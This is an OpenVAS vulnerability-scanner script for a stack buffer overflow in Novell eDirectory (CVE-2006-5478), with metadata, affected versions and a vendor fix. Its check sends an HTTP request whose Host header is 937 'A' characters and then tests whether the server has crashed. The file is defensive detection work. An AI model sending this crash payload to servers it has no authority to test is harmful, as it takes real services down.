###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_novell_edirectory_long_http_host_header_bof_vuln.nasl 5390 2017-02-21 18:39:27Z mime $
#
# Novell eDirectory Multiple Stack Based Buffer Overflow Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802674");
  script_version("$Revision: 5390 $");
  script_cve_id("CVE-2006-5478");
  script_bugtraq_id(20655);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
  script_tag(name:"creation_date", value:"2012-10-08 19:32:57 +0530 (Mon, 08 Oct 2012)");
  script_name("Novell eDirectory Multiple Stack Based Buffer Overflow Vulnerabilities");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_dependencies("novell_edirectory_detect.nasl","gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8028);
  script_mandatory_keys("eDirectory/installed","DHost/banner");

  script_xref(name:"URL", value:"http://secunia.com/advisories/22519");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1017125");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-06-035/");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-06-036/");

  tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary
  code and deny the server.

  Impact Level: System/Application";

  tag_affected = "Novell eDirectory 8.8.x to 8.8.1, and 8.x to 8.7.3.8 (8.7.3 SP8)";

  tag_insight = "The flaws are due to improper validation of user-supplied input via
  a long HTTP Host header, which triggers an overflow in the BuildRedirectURL
  function.";

  tag_solution = "Upgrade to Novell eDirectory version 8.8.1 FTF1 or 8.7.3.9 (8.7.3 SP9)
  For updates refer to http://www.novell.com/support/kb/doc.php?id=3723994";

  tag_summary = "This host is running Novell eDirectory and is prone to multiple
  multiple stack based buffer overflow vulnerabilities.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

edirPort = get_http_port( default:8028 );
banner = get_http_banner( port:edirPort );

# Check DHost HTTP Server
if( ! banner || ! egrep( pattern:"^Server: DHost\/[0-9\.]+ HttpStk\/[0-9\.]+", string:banner ) ) {
  exit( 0 );
}

## Send DoS attack
dosAtk = string( "GET /nds HTTP/1.1\r\n",
                 "Host: ", crap(length:937,data:"A"),
                 "\r\n\r\n" );
http_send_recv( port:edirPort, data:dosAtk );

## Check Server is alive or not
if(http_is_dead( port:edirPort, retry:2 ) ) {
  security_message( port:edirPort );
  exit( 0 );
}

exit( 99 );
